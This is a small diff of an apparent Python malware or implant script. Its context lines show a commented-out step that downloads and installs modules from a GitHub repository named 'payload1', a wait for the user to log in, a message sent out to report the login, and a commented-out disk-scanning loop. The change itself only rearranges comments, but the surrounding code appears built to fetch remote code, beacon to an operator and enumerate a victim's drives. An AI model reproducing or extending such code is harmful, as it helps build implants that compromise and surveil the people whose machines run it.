@@ -171,12 +171,12 @@ def sleep_until_user_loged():
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
-#Scan all available disks function
-#Param 1 : for all disks
-#Param 2 : for no OS disks
-
+#Sleep unitil %username% return a value
 sleep_until_user_loged()
 send_message("User loged.")
+
+#Param 1 : for all disks
+#Param 2 : for no OS disks
 
 """for disks in scan_disks(1, 10):
     for disks in disks:
